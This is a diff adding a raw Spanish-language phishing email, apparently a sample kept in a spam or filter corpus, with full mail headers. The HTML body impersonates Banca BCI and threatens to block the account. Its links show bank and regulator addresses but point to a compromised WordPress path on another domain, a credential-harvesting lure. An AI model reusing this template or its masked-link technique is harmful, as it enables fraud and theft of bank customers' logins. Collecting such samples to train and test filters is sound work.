@@ -1,0 +1,70 @@
+Return-Path: <restbar@restbar.arvixevps.com>
+Received: by mail.moscow.stalker.com (CommuniGate Pro PIPE 6.1.10f)
+  with PIPE id 47861775; Mon, 04 Apr 2016 10:35:21 +0300
+Received: from [72.20.112.40] (HELO stalker.com)
+  by mail.moscow.stalker.com (CommuniGate Pro SMTP 6.1.10f)
+  with ESMTP id 47861776 for support@moscow.stalker.com; Mon, 04 Apr 2016 10:34:59 +0300
+Received: from restbar.arvixevps.com ([50.116.122.226] verified)
+  by mail.stalker.com (CommuniGate Pro SMTP 6.1.9)
+  with ESMTPS id 80279714 for cgp-support@stalker.com; Mon, 04 Apr 2016 00:34:57 -0700
+Received-SPF: none
+ receiver=mail.stalker.com; client-ip=50.116.122.226; envelope-from=restbar@restbar.arvixevps.com
+Received: from restbar by restbar.arvixevps.com with local (Exim 4.86_1)
+	(envelope-from <restbar@restbar.arvixevps.com>)
+	id 1amz1M-000Eih-2s
+	for cgp-support@stalker.com; Mon, 04 Apr 2016 00:34:00 -0700
+To: cgp-support@stalker.com
+Subject: Cuenta Bloqueada - Banca bci - Case[7VDC0404-326JZ]
+From: Banca Bci <no-reply@publimailer.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Message-Id: <E1amz1M-000Eih-2s@restbar.arvixevps.com>
+Date: Mon, 04 Apr 2016 00:34:00 -0700
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - restbar.arvixevps.com
+X-AntiAbuse: Original Domain - stalker.com
+X-AntiAbuse: Originator/Caller UID/GID - [512 514] / [47 12]
+X-AntiAbuse: Sender Address Domain - restbar.arvixevps.com
+X-Get-Message-Sender-Via: restbar.arvixevps.com: authenticated_id: restbar/only user confirmed/virtual account not confirmed
+X-Authenticated-Sender: restbar.arvixevps.com: restbar
+X-Antivirus: avast! (VPS 160628-1, 28.06.2016), Inbound message
+X-Antivirus-Status: Clean
+
+<style type="text/css">
+<!--
+.style1 {font-family: Arial, Helvetica, sans-serif}
+-->
+</style>
+<div>
+  <div>
+    <p align="left" class="style1"><img src="http://www.bci.cl/medios/2012/personas/images/header-logo-bci.jpg"/></p>
+    <p align="left" class="style1"><strong>BCI- Atencion al cliente</strong><br>
+      Estimado Cliente :  <br>
+      Fecha y hora: 04/03/2016 <br>
+      <strong>Mensaje Importante</strong>: <br>
+      <br>
+      Hemos intentado comunicarnos con usted reiteradas veces al numero de contacto que nos proporciono<br>
+    con el fin de informarle que nuestros servidores de   						      procesos bancarios han sido actualizados y ya estan   						      </p>
+    <p align="left" class="style1">operativos, por tal motivo
+    necesitamos que tome las medidas necesarias e ingrese al link que le proporcionamos.<br>
+    Si usted omite este mensaje su cuenta sera bloqueada y sera necesario   acudir a nuestra sucursal más cercana </p>
+    <p align="left" class="style1">para el desbloqueo de su cuenta
+      y posteriormente la actualizacion de esta.<br>
+      <strong>Esto le tomara unos minutos y nos permitira mejorar sustancialmente la seguridad y calidad de nuestro servicio.</strong><br>
+      <br>
+      <br>
+      Ingresar Aqui: <a href="http://fixgroup.net/wp-content/languages/Segurid/" target="_blank">https://www.bci.cl/sitioseguro1/login/login_personas_act.html</a><br>
+      <br>
+      <br>
+      ______________________________________________________________________________<br>
+      <strong>Importante:</strong> <br>
+• Este mail es generado de manera automatica, por favor no responda a este mensaje.
+<br>
+• Los comentarios aqui ingresados son exclusiva responsabilidad de nuestro cliente y no involucran en absoluto al BCI.<br>
+• Informese sobre la garantia estatal de los depositos en su banco o en <a href="http://fixgroup.net/wp-content/languages/Segurid/" target="_blank">www.sbif.cl</a>. </p>
+    <div></div>
+    <div><br>
+    </div>
+  </div>
+</div>
+
